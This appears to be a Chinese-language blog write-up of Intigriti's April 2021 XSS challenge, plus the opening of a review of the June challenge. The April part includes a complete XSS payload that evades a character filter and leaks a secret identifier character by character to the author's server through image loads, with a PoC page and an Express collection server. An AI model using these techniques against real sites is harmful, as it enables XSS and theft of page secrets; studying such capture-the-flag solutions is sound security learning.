index.html，底下我只擷取題目相關的程式碼： &lt;iframe id=\"wafIframe\" src=\"./waf.html\" sandbox=\"allow-scripts\" style=\"display:none\">&lt;/iframe> &lt;script> const wafIframe = document.getElementById('wafIframe').contentWindow; const identifier = getIdentifier(); function getIdentifier() &#123; const buf = new Uint32Array(2); crypto.getRandomValues(buf); return buf[0].toString(36) + buf[1].toString(36) &#125; function htmlError(str, safe)&#123; const div = document.getElementById(\"error-content\"); const container = document.getElementById(\"error-container\"); container.style.display = \"block\"; if(safe) div.innerHTML = str; else div.innerText = str; window.setTimeout(function()&#123; div.innerHTML = \"\"; container.style.display = \"none\"; &#125;, 10000); &#125; function addError(str)&#123; wafIframe.postMessage(&#123; identifier, str &#125;, '*'); &#125; window.addEventListener('message', e => &#123; if(e.data.type === 'waf')&#123; if(identifier !== e.data.identifier) throw /nice try/ htmlError(e.data.str, e.data.safe) &#125; &#125;); window.onload = () => &#123; const error = (new URL(location)).searchParams.get('error'); if(error !== null) addError(error); &#125; &lt;/script> 首先在 window onload 的時候會從 URL 的 query string 上面拿 error 的內容出來，然後呼叫 addError(error)。接著會把內容加上一個隨機產生的 id 用 postMessage 送到 wafIframe。 wafIframe 處理完畢之後會再用 postMessage 把結果送回來，先檢查 identifier 是否相同，相同的話驗證通過，再看 e.data.safe 是不是 true，是的話就用 innerHTML 新增 e.data.str，否則的話就用 innerText。 再來我們看看另一個頁面 waf.html 在幹嘛： onmessage = e => &#123; const identifier = e.data.identifier; e.source.postMessage(&#123; type:'waf', identifier, str: e.data.str, safe: (new WAF()).isSafe(e.data.str) &#125;,'*'); &#125; function WAF() &#123; const forbidden_words = ['&lt;style', '&lt;iframe', '&lt;embed', '&lt;form', '&lt;input', '&lt;button', '&lt;svg', '&lt;script', '&lt;math', '&lt;base', '&lt;link', 'javascript:', 'data:']; const dangerous_operators = ['\"', \"'\", '`', '(', ')', '&#123;', '&#125;', '[', ']', '='] function decodeHTMLEntities(str) &#123; var ta = document.createElement('textarea'); ta.innerHTML = str; return ta.value; &#125; function onlyASCII(str)&#123; return str.replace(/[^\\x21-\\x7e]/g,''); &#125; function firstTag(str)&#123; return str.search(/&lt;[a-z]+/i) &#125; function firstOnHandler(str)&#123; return str.search(/on[a-z]&#123;3,&#125;/i) &#125; function firstEqual(str)&#123; return str.search(/=/); &#125; function hasDangerousOperators(str)&#123; return dangerous_operators.some(op=>str.includes(op)); &#125; function hasForbiddenWord(str)&#123; return forbidden_words.some(word=>str.search(new RegExp(word, 'gi'))!==-1); &#125; this.isSafe = function(str) &#123; let decoded = onlyASCII(decodeHTMLEntities(str)); const first_tag = firstTag(decoded); if(first_tag === -1) return true; decoded = decoded.slice(first_tag); if(hasForbiddenWord(decoded)) return false; const first_on_handler = firstOnHandler(decoded); if(first_on_handler === -1) return true; decoded = decoded.slice(first_on_handler) const first_equal = firstEqual(decoded); if(first_equal === -1) return true; decoded = decoded.slice(first_equal+1); if(hasDangerousOperators(decoded)) return false; return true; &#125; &#125; 這邊收到 index 傳來的資料時會經過一系列驗證，看看送來的資料是不是 safe，做的檢查依序為： 先把送來的資料 decode 而且只允許 ASCII 找第一個 html tag 並且過濾掉 [&#39;&lt;style&#39;, &#39;&lt;iframe&#39;, &#39;&lt;embed&#39;, &#39;&lt;form&#39;, &#39;&lt;input&#39;, &#39;&lt;button&#39;, &#39;&lt;svg&#39;, &#39;&lt;script&#39;, &#39;&lt;math&#39;, &#39;&lt;base&#39;, &#39;&lt;link&#39;, &#39;javascript:&#39;, &#39;data:&#39;] 找 onXXX handler 之後出現的第一個 &#x3D; 號 不能有以下字元 [&#39;&quot;&#39;, &quot;&#39;&quot;, &#39;``&#39;, &#39;(&#39;, &#39;)&#39;, &#39;&#123;&#39;, &#39;&#125;&#39;, &#39;[&#39;, &#39;]&#39;, &#39;=&#39;] 以上都成功的話才 safe，才會被 index.html 當作 innerHTML 來解釋 結合以上條件，如果我傳 error&#x3D;123，畫面就會顯示 123。如果我傳 &lt;h1&gt;hello&lt;/h1&gt;，畫面就真的會顯示一個 hello 的 heading，但如果我傳 &lt;script&gt;alert(1)&lt;/script&gt;，畫面就只會用文字顯示出來而不是當作 HTML 來執行，因為 safe 是 false。 以上大概就是題目的基本介紹，在這邊非常推薦大家自己先玩玩看，至少嘗試個一兩個小時卡關卡到爆之後再來看心得，收穫會多很多。 底下就是解題的心路歷程，會直接按照我解題的時間軸來寫。 初次嘗試從題目中不難看出，想要成功 XSS 的話有兩條路可以走： 用各種奇技淫巧繞過限制，直接在頁面上執行 XSS 自己用 window.open 打開這頁面然後 postMessage，偽造訊息並且讓 safe 是 true，這樣就可以插入任意 HTML 一開始我是朝 1 的方向來想，因為 2 的話需要知道 identifier 是什麼，但因為那是隨機的所以不可能，我認為是一條死路。 所以接下來就是要想，要怎麼樣去繞過判斷的限制。 從濾掉的 tag 中可以發現我最愛的 &lt;img&gt; 沒有被濾掉，而 onXX 的 event handler 只是限制內容，也沒有一起被濾掉，所以可以用：&lt;img src=x onerror=123&gt; 來執行 JS。 但問題來了，儘管可以執行 JS，但不能用的字元太多了，() 不能用所以不能呼叫函式，想用反引號 &#96; 來呼叫也不行，那要怎麼樣執行 alert？我在這邊卡了很久，最後去 google：「js call function without parentheses」，找到了這一篇：js call function without parentheses，裡面提到了很多沒有想過的招數。 例如說物件的 valueOf 搭配 +，或者是用 new 的方式搭配 constructor，或最讓我驚豔的一個是 onerror&#x3D;eval 搭配 throw，這些都是超級帥的技巧，試著不用 () 來繞過限制。 但以上這些通通都沒用，因為限制實在是太嚴格了，物件的 &#123;&#125; 不能用，new 因為要有空格所以也不能用。不能有空格是因為 &lt;img onerror=new abc&gt; 會被解釋為：&lt;img onerror=&quot;new&quot; abc&gt;，如果想要一起被放入 onerror 就只能自己用 &quot; 框起來，但 &quot; 是限制的字元不能使用，所以 onerror 裡面不能出現空格。 throw 看起來有點機會，但是作為執行前提的 onerror=eval 有個等號，所以也沒辦法使用。 在這時候我就想說，那如果把限制的字元用 HTML entity encode 呢？把 = 變成 &amp;#61; 來繞過限制。 試了之後發現沒有用，因為早在第一步 decodeHTMLEntities(str) 的時候就被還原成字元了，這時候我有兩個想法： 那可以對 decodeHTMLEntities 裡面的 textarea XSS 嗎？ 那可以 double encode 嗎？ 第一條路行不通，因為雖然有 ta.innerHTML = str;，但這元素從來沒有被放到 DOM 上，所以沒有用。 第二條路也行不通，因為最後 &amp;#61; 只會被視作文字來顯示。 嘗試了許久，最後我什麼都試不出來，可以執行成功的程式碼頂多只有：&lt;img src=x onerror=throw/0/+identifier&gt;，把 identifier 作為錯誤訊息丟出來，然後就沒了。但這也什麼都做不到。 提示的幫助這個挑戰每獲得 100 個愛心就會放出提示，而因為題目難度太高的關係所以也有加碼提示，我那時看到的有： First hint: find the objective! (4&#x2F;19 21:57) Time for another hint! Where to smuggle data? (4&#x2F;20 00:24) Time for another tip! One bite after another! (4&#x2F;20 19:55) 說實在的，以上這幾個提示我都沒有看很懂，比較了解的是第三個，應該是 One “Byte” after another 的意思，回顧到我最前面所提到的 XS-Leaks 那個東西，我這時想說：「靠，該不會我一開始以為死路的路才是正解吧」。 我說的死路就是前面提到的：「從別的地方自己 postMessage 偽造訊息」，但前提是我要知道隨機產生的 identifier 是什麼才能成功。如果說這條路才是正解，那要解開的話流程就應該是： 開一個自己的網頁，用 window.open 打開 xss challenge 用某種方法得到 identifier 從這個網頁自己 postMessage 過去，插入任意 HTML 只要第二步成功了就可以整個串起來了。但問題是，我要怎麼知道 identifier 是什麼？既然提示說 one byte after another，那我猜應該是一個字元一個字元洩漏出去，所以可以先從一個字元開始想。 此時我想到這個：&lt;img src=x onerror=identifier&lt;&#39;1&#39;?is_zero:keep_trying&gt;，我們可以用三元運算子搭配 &lt; 來判斷第一個字是什麼，雖然不能用字串，但 &#39;1&#39; 可以用 &lt;div id=n1&gt;1&lt;/div&gt; + n1.innerText 來取代，來避開單雙引號。而三元運算子可以一直巢狀下去，像是這樣： identifier&lt;'1'?is_zero: identifier&lt;'2'?is_one: identifier&lt;'3'?is_two: identifier&lt;'4'?is_three: .... 所以我們確實可以透過這方法得知 identifier 的第一個字元是什麼，但問題來了，知道之後，我們怎樣把這個資訊傳出去？ 我們不能呼叫 function，甚至連賦值也不行，怎樣把資訊傳出去？如果可以用 = 的話那就可以 window.opener.location = xxx+1 之類的去改變 window.opener 的資訊，或者是：&lt;img id=a src=x&gt; 搭配 a.src=xxxx 去載入一個新的圖片，這樣我從 server side 就可以知道洩漏的字元是什麼。 但因為沒辦法用等號，所以上面這些都做不到。 這時候我又卡關了，而且卡了非常久，完全想不到該怎麼把資訊傳出去，這時候等到了下一個提示： Here’s an extra tip: ++ is also an assignment (4&#x2F;20 22:17) 我一開始看見這提示時覺得好像有點用，卻又不知道該怎麼用。++ 也可以改變值沒有錯，可是有什麼用呢？我一開始想說朝 window.opener 的方向去想，有沒有一些屬性是可以操控的，例如說：window.opener.name++是可行的嗎？或是有什麼其他屬性可以操控的。 如果我能夠改變某個 window.opener 的屬性，就能把洩漏的資訊透過某種方式傳回去。可是我找了很久還去翻了 spec，發現好像沒這種東西。window.opener.location 可以改變，但不能用 ++，因為 ++ 就像是 window.opener.location = window.opener.location + 1，執行的話會拋錯，因為有涉及到讀取： VM82:1 Uncaught DOMException: Blocked a frame with origin &quot;https:&#x2F;&#x2F;challenge-0421.intigriti.io&quot; from accessing a cross-origin frame. 這時我想起了忘記在哪學到的一個招數，利用圖片的載入。 舉例來說，讓一張圖片不被載入，然後透過 ++ 改變 CSS 或其他屬性讓它載入，這樣我就可以從 server 知道這個資訊。 我試了這個： &lt;img id=n0 src=//server/n0 style=\"opacity:0;\"> &lt;img src=x onerror=identifier&lt;'1'?n0.style.opacity++:...> 但透明度是 0 還是會載入圖片，所以沒有用。後來再試了幾個屬性，想起了最近有用到的一個：loading。 以往如果要 lazy load 圖片的話，比較多是透過套件，早期需要去偵測 scroll，近期則是用 IntersectionObserver 就行了。而再更近一點，現在有不少瀏覽器有支援原生的 lazy loading：&lt;img src=x loding=&quot;lazy&quot;&gt;，如果圖片距離可視區域沒有超過一個 threshold 的話就不會被載入。 因此我們可以這樣做： &lt;div style=\"height: 9999px\">&lt;/div> &lt;img id=n0 src=//server/n0 loading=\"lazy\"> &lt;img src=x onerror=identifier&lt;'1'?n0.loading++:...> 先用一個很高的 div 把圖片往下推，推到 threshold 之外，然後在確認第一個字元是 0 的時候，把 n0 的 loading++，++ 之後會是 NaN，然後因為 loading 沒有 NaN 這個值，所以會 fallback 到預設的 auto，就會載入圖片。 假設 server/n0 是我自己的 server，那我收到 n0 這個 request，就代表第一個字元是 0。把這個想法擴展，我們確實可以知道第一個字元是什麼，像這樣： &lt;div style=\"height: 9999px\">&lt;/div> &lt;img id=n0 src=//server/n0 loading=\"lazy\"> &lt;img id=n1 src=//server/n1 loading=\"lazy\"> &lt;img id=n2 src=//server/n2 loading=\"lazy\"> &lt;img src=x onerror= identifier&lt;'1'?n0.loading++: identifier&lt;'2'?n1.loading++: identifier&lt;'3'?n2.loading++: ...> 有了第一個字元了！那第二個怎麼辦？ 沒辦法用 identifier[1]，因為不能用括號。我想說有沒有 str.1 這種語法，結果也沒有。 在想過各種可能以後，我覺得這條路是死路，不可能在不能使用 []()&#123;&#125; 的情況下，拿到第 n 個字元。 解開弱化版？雖然說我覺得不可能拿到第 n 個字元，解題也就此卡住，但我有了一個大膽的想法。 字串我沒有辦法拿到第 n 個字元，但如果是數字呢？我是不是可以透過一系列數學運算拿到？例如說 123，要拿到 2 就是 123&#x2F;10%10 之類的（不過出來會是小數）。或者是直接利用二進位，num&amp;1 就可以知道 num 的最後一個 bit，num&amp;2 就可以知道倒數第二個 bit，以此類推，就可以知道每一個 bit 是多少。 可是 identifier 不是數字，那該怎麼辦？想辦法轉成數字！如果 identifier 只包含 0-9a-z，那我們可以在前面加上 0x 並搭配 + 轉成數字，最後會像這樣： &lt;body> &lt;div style=height:9999px id=a>0x&lt;/div> &lt;img src=https://example.com/x00 id=x00 loading=lazy> &lt;img src=https://example.com/x01 id=x01 loading=lazy> &lt;img src=https://example.com/x10 id=x10 loading=lazy> &lt;img src=https://example.com/x11 id=x11 loading=lazy> &lt;img src=https://example.com/x20 id=x20 loading=lazy> &lt;img src=https://example.com/x21 id=x21 loading=lazy> &lt;img src=x onerror= a.innerText+identifier&amp;1?x01.loading++:x00.loading++; a.innerText+identifier&amp;2?x11.loading++:x10.loading++; a.innerText+identifier&amp;4?x21.loading++:x20.loading++ > &lt;/body> &lt;script> var identifier = 'a4' // 164 // 10100100 &lt;/script> 這邊要注意的是 operator 的優先順序，有些如果順序不如預期就無法那樣用，例如說：+&#39;0x&#39;+identifier 就會先執行 +0x，而不是先把後面的字串相加。這邊剛好 &amp; 會先試著轉成數字，所以才能這樣用。 從上面的 POC 可以證明如果我們能把 identifier 轉成數字，我們就可以解開這題。但 identifier 可能會有 f 以上的字元，那他可以轉成數字的機率是多少呢？ var count = 0 for(let i=0; i&lt;100000;i++) &#123; var id = getIdentifier() if (!Number.isNaN(Number('0x' + id))) &#123; count++ &#125; &#125; // 7, 0.007 console.log(count, (count * 100) / 100000) 不到 0.01%，非常低的機率，平均需要一萬次才能成功。 雖然這個機率無法接受，但至少我知道這個弱化的版本是解得開的。 又靠提示在弱化版解開之後，我想說差不多就到這裡了。會不會是我方向錯誤，其實根本不是這樣解？ 因為我真的想不到該怎樣才能拿到 identifier[n]，覺得這不可能。 此時我又看到了新的提示： “Behind a Greater Oracle there stands one great Identity” (leak it) (4&#x2F;22 15:53) Tipping time! Goal &lt; object(ive) (4&#x2F;23 01:58) 從這兩個新的提示，驗證了我的方向其實是對的，就是要 leak identifier，然後就是要用 &lt; 的符號去比較。 所以我應該只差最後一兩步而已，就快要破關了。但這一兩步真的很難。 雖然說已經想要放棄了，但過了一天，又有一個新的想法：「其實根本不需要單獨拿到第二個字元！假設我有個地方 str 存第一個字元，那我只要 identifier &lt; str + &#39;1&#39; 不就好了嗎？」 如果有地方存已經找到的字元，那就可以用類似迴圈的概念去跑，就可以洩漏出所有字元了。 那這個地方會是哪裡？這地方需要可以從 opener 傳過來，因為只有 opener 會知道現在洩漏出去的字元是什麼。可是因為 cross origin 的關係，opener 沒有一個屬性是可以存取的。 嘗試了大概一兩個小時，我突然想到可以反過來，不是從 opener 拿東西，而是 opener 把東西傳給 open 的 window。怎麼傳？可以用 location.hash！ 從我們的網頁中用 window.open 開啟 XSS challenge 之後，可以用 win.location = url + &#39;#a&#39; 來加上 hash 而且不會重新載入網頁。加入之後在網頁中就可以用 location.hash 存取到。透過 location.hash 在 cross origin 的 window 之間交換資訊。 雖然說又往前邁進了一步，但其實還有兩個問題需要被解決： 我們需要一個類似迴圈的東西 我們需要能夠多次發送 request 到 server 先從第一個問題開始，我們需要不斷執行類似的程式碼，才能洩漏一個一個字元出來。這個倒是不難，可以透過 this.src++ 去改變 img 的 src，只要 src 一被賦值，儘管值一樣，還是會重新載入圖片，例如說這樣： &lt;body> &lt;script> var count = 1 &lt;/script> &lt;img src=x onerror=count&lt;10?count++&amp;&amp;src++:console.log(count)> &lt;/body> 上面的程式碼會不斷把 count++，直到符合條件為止。count++&amp;&amp;src++ 也可以換成 count++ + src++，把空格去掉變成很多加號的 count+++src++。 迴圈沒有問題了，接下來是多次洩露資訊的部分。之前我們用的 lazy loading，一個圖片只能用一次，因為圖片一旦載入了就是載入了，沒辦法再用 img.loading++ 來讓它再被載入一次。那怎麼辦呢？我們需要一個管道可以讓我們在指定的時機發送正確的 request。 在隨便亂試試了一段時間之後，我發現了一個神奇的屬性：srcset，神奇的點在於它跟 src 一起用的時候。 當我 src 與 srcset 一起設定的時候，瀏覽器會優先載入 srcset 的 url，而神奇的是當我把 src++ 的時候，就會再載入一次 srcset！下面是範例，會把 x2 載入十遍： &lt;body> &lt;script> var count = 1 &lt;/script> &lt;img src=x1 srcset=x2 onerror=count&lt;10?count+++this.src++:123> &lt;/body> 既然這兩個問題都解開了，那把這些拼湊起來，就可以湊出最後的答案了，流程如下： 打開 poc.html，window.open XSS challenge error 帶上我們準備好的 payload 用 img 的 onerror 執行一堆巢狀的三元運算子，符合條件就載入相對應的圖片，洩漏出第 n 個字，並等待下一圈迴圈開始 server 接收到圖片，知道第 n 個字是什麼 server 把結果傳給 poc.html，poc.html 去更新 win.location.hash 更新完之後 server 透過回傳 response 來開啟下一圈迴圈，把 n+1，回到第 3 步 重複以上動作直到找出 token 以上是最理想的流程，但因為時間因素所以我有幾個地方沒有照著做，例如說： 我假設 identifier 的第一個字是 1，不是的話就跳掉 server 等待 500ms 就會開始下一圈迴圈，但有可能 location.hash 還沒更新完成 server 傳結果給 poc.html 最理想是用 websocket，但我偷懶用 long polling 我懶的判斷 identifier 是不是全部抓完，所以等 length &gt; 10 就開始嘗試 postMessage 最後的程式碼長這樣： var payload = ` &lt;img srcset=//my_server/0 id=n0 alt=#> &lt;img srcset=//my_server/1 id=n1 alt=a> &lt;img srcset=//my_server/2 id=n2 alt=b> &lt;img srcset=//my_server/3 id=n3 alt=c> &lt;img srcset=//my_server/4 id=n4 alt=d> &lt;img srcset=//my_server/5 id=n5 alt=e> &lt;img srcset=//my_server/6 id=n6 alt=f> &lt;img srcset=//my_server/7 id=n7 alt=g> &lt;img srcset=//my_server/8 id=n8 alt=h> &lt;img srcset=//my_server/9 id=n9 alt=i> &lt;img srcset=//my_server/a id=n10 alt=j> &lt;img srcset=//my_server/b id=n11 alt=k> &lt;img srcset=//my_server/c id=n12 alt=l> &lt;img srcset=//my_server/d id=n13 alt=m> &lt;img srcset=//my_server/e id=n14 alt=n> &lt;img srcset=//my_server/f id=n15 alt=o> &lt;img srcset=//my_server/g id=n16 alt=p> &lt;img srcset=//my_server/h id=n17 alt=q> &lt;img srcset=//my_server/i id=n18 alt=r> &lt;img srcset=//my_server/j id=n19 alt=s> &lt;img srcset=//my_server/k id=n20 alt=t> &lt;img srcset=//my_server/l id=n21 alt=u> &lt;img srcset=//my_server/m id=n22 alt=v> &lt;img srcset=//my_server/n id=n23 alt=w> &lt;img srcset=//my_server/o id=n24 alt=x> &lt;img srcset=//my_server/p id=n25 alt=y> &lt;img srcset=//my_server/q id=n26 alt=z> &lt;img srcset=//my_server/r id=n27 alt=0> &lt;img srcset=//my_server/s id=n28> &lt;img srcset=//my_server/t id=n29> &lt;img srcset=//my_server/u id=n30> &lt;img srcset=//my_server/v id=n31> &lt;img srcset=//my_server/w id=n32> &lt;img srcset=//my_server/x id=n33> &lt;img srcset=//my_server/y id=n34> &lt;img srcset=//my_server/z id=n35> &lt;img id=lo srcset=//my_server/loop onerror= n0.alt+identifier&lt;location.hash+1?n0.src+++lo.src++: n0.alt+identifier&lt;location.hash+2?n1.src+++lo.src++: n0.alt+identifier&lt;location.hash+3?n2.src+++lo.src++: n0.alt+identifier&lt;location.hash+4?n3.src+++lo.src++: n0.alt+identifier&lt;location.hash+5?n4.src+++lo.src++: n0.alt+identifier&lt;location.hash+6?n5.src+++lo.src++: n0.alt+identifier&lt;location.hash+7?n6.src+++lo.src++: n0.alt+identifier&lt;location.hash+8?n7.src+++lo.src++: n0.alt+identifier&lt;location.hash+9?n8.src+++lo.src++: n0.alt+identifier&lt;location.hash+n1.alt?n9.src+++lo.src++: n0.alt+identifier&lt;location.hash+n2.alt?n10.src+++lo.src++: n0.alt+identifier&lt;location.hash+n3.alt?n11.src+++lo.src++: n0.alt+identifier&lt;location.hash+n4.alt?n12.src+++lo.src++: n0.alt+identifier&lt;location.hash+n5.alt?n13.src+++lo.src++: n0.alt+identifier&lt;location.hash+n6.alt?n14.src+++lo.src++: n0.alt+identifier&lt;location.hash+n7.alt?n15.src+++lo.src++: n0.alt+identifier&lt;location.hash+n8.alt?n16.src+++lo.src++: n0.alt+identifier&lt;location.hash+n9.alt?n17.src+++lo.src++: n0.alt+identifier&lt;location.hash+n10.alt?n18.src+++lo.src++: n0.alt+identifier&lt;location.hash+n11.alt?n19.src+++lo.src++: n0.alt+identifier&lt;location.hash+n12.alt?n20.src+++lo.src++: n0.alt+identifier&lt;location.hash+n13.alt?n21.src+++lo.src++: n0.alt+identifier&lt;location.hash+n14.alt?n22.src+++lo.src++: n0.alt+identifier&lt;location.hash+n15.alt?n23.src+++lo.src++: n0.alt+identifier&lt;location.hash+n16.alt?n24.src+++lo.src++: n0.alt+identifier&lt;location.hash+n17.alt?n25.src+++lo.src++: n0.alt+identifier&lt;location.hash+n18.alt?n26.src+++lo.src++: n0.alt+identifier&lt;location.hash+n19.alt?n27.src+++lo.src++: n0.alt+identifier&lt;location.hash+n20.alt?n28.src+++lo.src++: n0.alt+identifier&lt;location.hash+n21.alt?n29.src+++lo.src++: n0.alt+identifier&lt;location.hash+n22.alt?n30.src+++lo.src++: n0.alt+identifier&lt;location.hash+n23.alt?n31.src+++lo.src++: n0.alt+identifier&lt;location.hash+n24.alt?n32.src+++lo.src++: n0.alt+identifier&lt;location.hash+n25.alt?n33.src+++lo.src++: n0.alt+identifier&lt;location.hash+n26.alt?n34.src+++lo.src++: n35.src+++lo.src++>` &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;/head> &lt;body> &lt;/body> &lt;script> var payload = // see above payload = encodeURIComponent(payload) var baseUrl = 'https://my_server' // reset first fetch(baseUrl + '/reset').then(() => &#123; start() &#125;) async function start() &#123; // assume identifier start with 1 console.log('POC started') if (window.xssWindow) &#123; window.xssWindow.close() &#125; window.xssWindow = window.open(`https://challenge-0421.intigriti.io/?error=$&#123;payload&#125;#1`, '_blank') polling() &#125; function polling() &#123; fetch(baseUrl + '/polling').then(res => res.text()).then((token) => &#123; // guess fail, restart if (token === '1zz') &#123; fetch(baseUrl + '/reset').then(() => &#123; console.log('guess fail, restart') start() &#125;) return &#125; if (token.length >= 10) &#123; window.xssWindow.postMessage(&#123; type: 'waf', identifier: token, str: '&lt;img src=xxx onerror=alert(\"flag&#123;THIS_IS_THE_FLAG&#125;\")>', safe: true &#125;, '*') &#125; window.xssWindow.location = `https://challenge-0421.intigriti.io/?error=$&#123;payload&#125;#$&#123;token&#125;` // After POC finsihed, polling will timeout and got error message, I don't want to print the message if (token.length > 20) &#123; return &#125; console.log('token:', token) polling() &#125;) &#125; &lt;/script> &lt;/html> 寫得很隨便很醜而且有 bug 的 server side code： var express = require('express') const app = express() app.use(express.static('public')); app.use((req, res, next) => &#123; res.set('Access-Control-Allow-Origin', '*'); next() &#125;) const handlerDelay = 100 const loopDelay = 550 var initialData = &#123; count: 0, token: '1', canStartLoop: false, loopStarted: false, canSendBack: false &#125; var data = &#123;...initialData&#125; app.get('/reset', (req, res) => &#123; data = &#123;...initialData&#125; console.log('======reset=====') res.end('reset ok') &#125;) app.get('/polling', (req, res) => &#123; function handle(req, res) &#123; if (data.canSendBack) &#123; data.canSendBack = false res.status(200) res.end(data.token) console.log('send back token:', data.token) if (data.token.length &lt; 14) &#123; setTimeout(() => &#123; data.canStartLoop = true &#125;, loopDelay) &#125; &#125; else &#123; setTimeout(() => &#123; handle(req, res) &#125;, handlerDelay) &#125; &#125; handle(req, res) &#125;) app.get('/loop', (req, res) => &#123; function handle(req, res) &#123; if (data.canStartLoop) &#123; data.canStartLoop = false res.status(500) res.end() &#125; else &#123; setTimeout(() => &#123; handle(req, res) &#125;, handlerDelay) &#125; &#125; handle(req, res) &#125;) app.get('/:char', (req, res) => &#123; // already start stealing identifier if (req.params.char.length > 1) &#123; res.end() return &#125; console.log('char received', req.params.char) if (data.loopStarted) &#123; data.token += req.params.char console.log('token:', data.token) data.canSendBack = true res.status(500) res.end() return &#125; // first round data.count++ if (data.count === 36) &#123; console.log('initial image loaded, start loop') data.count = 0 data.loopStarted = true data.canStartLoop = true &#125; res.status(500) res.end() &#125;) app.listen(5555, () => &#123; console.log('5555') &#125;) 結語從這個 XSS challenge 裡面學到滿多的東西的，例如說： 利用 img src + onerror 製造迴圈（其實精確地講應該是遞迴啦） 利用 img src + srcset 來重複載入圖片 利用 location.hash 交換資訊 換個方式思考問題，用 &gt; &lt; 取代 &#x3D;&#x3D;，用比較代替等號 利用 &#x2F;a&#x2F;.source 或是 img.alt 之類的東西來取代字串，不使用單雙反引號構造字串 雖然花了不少時間，但解出來的那一刻成就感滿大的，而且又是難題所以成就感更高了。 這篇主要是描述我自己的解法，雖然有點麻煩（因為需要 server side），但是是我唯一可以想出來的解法。 如果沒意外的話，下一篇會跟大家介紹官方解答，利用一個我不會用而且完全忽略掉的元素：&lt;object&gt;。","link":"/2021/05/25/xss-challenge-by-intigriti-writeup/"},{"title":"Intigriti 六月份 XSS 挑戰檢討","text":"前言六月份的挑戰沒解出來，這篇透過兩篇公開的 writeup 來學習一下其他人的做法，順便檢討一下自己哪邊可以再加強。 程式碼分析與思考過程六月份挑戰：https://challenge-0621.intigriti.io/ 程式碼： const unsafeCharacters = [\"&amp;\", \"`\", \"\\\"\", \"&#123;\", \"&#125;\", \"(\", \")\", \"[\", \"]\", \"=\", \",\", \"+\"]; function sanitize(str) &#123; str += \"\"; for (let char of unsafeCharacters) &#123; str = str.replaceAll(char, `&amp;#x$&#123;char.codePointAt().toString(0x10)&#125;;`); &#125; return str; &#125; function showMessage(title = \"\", message = \"\", button = &#123; text: \"Close\", action: \"this.parentElement.parentElement.parentElement.remove();\", &#125;) &#123; let elem = (new Range).createContextualFragment(` &lt;div class=\"alert\"> &lt;div class=\"alert-inner\"> &lt;div class=\"page-bar\"> &lt;h3>$&#123;sanitize(title)&#125;&lt;/h3> &lt;button onclick=\"$&#123;sanitize(button.action)&#125;\">$&#123;sanitize(button.text)&#125;&lt;/button> &lt;/div> &lt;div class=\"page-content\"> $&#123;sanitize(message)&#125; &lt;/div> &lt;/div> &lt;/div> `); document.body.append(elem); &#125; let inputFields = &#123; passwordLength: document.getElementById(\"password-length\"), allowNumbers: document.getElementById(\"allow-numbers\"), allowSymbols: document.getElementById(\"allow-symbols\"), &#125; let generating = false; async function generate() &#123; if (generating) &#123; return; &#125; requestAnimationFrame(_ => (generating = false)); generating = true; let passwordLength = inputFields.passwordLength.value; let json = `&#123; \"passwordLength\": $&#123;passwordLength&#125;, \"seed\": $&#123;crypto.getRandomValues(new Uint32Array(1))[0]&#125;, \"allowNumbers\": $&#123;inputFields.allowNumbers.checked&#125;, \"allowSymbols\": $&#123;inputFields.allowSymbols.checked&#125; &#125;`; if (!(passwordLength = passwordLength.match(/^\\d+$/gm))) &#123; return showMessage(\"Error\", \"Password Length must be a number.\"); &#125; passwordLength = Number(passwordLength[0]); let wasm = await WebAssembly.instantiateStreaming(fetch(\"program.wasm\"), &#123; env: &#123; log_str: idx => &#123; let str = \"\"; while (u8[idx] != 0) &#123; str += String.fromCodePoint(u8[idx]); ++idx; &#125; console.log(str); &#125;, log_int: console.log, &#125;&#125;); let u8 = new Uint8Array(wasm.instance.exports.memory.buffer); let options = wasm.instance.exports.malloc(json.length + 1); let password = wasm.instance.exports.malloc(Number(passwordLength) + 1); for (let idx = 0; idx &lt; json.length; ++idx) &#123; u8[options + idx] = json.codePointAt(idx) % 0xff; &#125; u8[options + json.length] = 0; wasm.instance.exports.generate_password(options, password); let output_password = \"\"; for (let idx = 0; idx &lt; passwordLength; ++idx) &#123; output_password += String.fromCodePoint(u8[password + idx]); &#125; showMessage(\"Password Generated\", \"Your password is: \" + output_password, &#123; text: \"OK\", action: \"generateAnother();\", &#125;); &#125; function generateAnother() &#123; let params = new URLSearchParams; params.set(\"passwordLength\", inputFields.passwordLength.value); params.set(\"allowNumbers\", inputFields.allowNumbers.checked); params.set(\"allowSymbols\", inputFields.allowSymbols.checked); params.set(\"timestamp\", Number(new Date)); location.search = params; &#125; let settings = new URLSearchParams(location.search); inputFields.passwordLength.value = settings.get(\"passwordLength\") ?? 8; inputFields.allowNumbers.checked = settings.get(\"allowNumbers\") !== \"false\"; inputFields.allowSymbols.checked = settings.get(\"allowSymbols\") !== \"false\"; 基本上就是從 query string 拿一些參數，丟到 wasm 裡面去產生密碼，當初在解這題的時候有發現幾個地方需要繞過。 第一個是 if (!(passwordLength = passwordLength.match(/^\\d+$/gm))) &#123;，限定密碼長度只能是數字。 當初看到這邊時有注意到 m 那個 flag 沒必要，是配對換行的，所以 123\\nabc一樣可以通過。但後來卡住的點是那個 value 是從 input 拿出來的，而 input 會把 \\n 過濾掉，所以沒辦法用 \\n。 那時候就在這邊整個卡死。 第二個需要做事情的點就是 wasm 那一段了，那段我有試著把它 decompile 出來不過看不懂在幹嘛。 我那時直覺猜測的解法是透過 passwordLength 去改造傳進去的 JSON，然後把 seed 固定在某個數字，就會產生出某個可行的 payload（後來發現根本不是這樣） 不過因為我也不知道 wasm 在幹嘛，所以當時就繼續往下看，產生出的密碼會經過過濾，這些字元都不能用： [&quot;&amp;&quot;, &quot;&#96;&quot;, &quot;\\&quot;&quot;, &quot;&#123;&quot;, &quot;&#125;&quot;, &quot;(&quot;, &quot;)&quot;, &quot;[&quot;, &quot;]&quot;, &quot;&#x3D;&quot;, &quot;,&quot;, &quot;+&quot;] 沒有過濾掉 &lt;&gt; 所以可以新增標籤，可是反引號跟 () 全都被過濾掉，被過濾到的字元太多了，我沒想到可以繞過的方法。 當初解題的思路大概就是這樣，有找到三個需要做事的地方，但因為三個地方都沒繞過，所以就沒解出來。 接下來來看一下別人的 writeup，中途順便做個自我檢討。 terjanq連結：How to solve an XSS challenge from Intigriti in under 60 minutes 這篇除了分享解法之外還分享了他是怎麼思考的，在一小時內就把這題解開，真的猛。 他的解法是掃過一遍 code 之後發現 wasm 那邊一定有問題，就先開始測試那邊怎麼打下來。測試的方法就是複製一份 code 然後自己去改 JSON payload 去測 wasm。 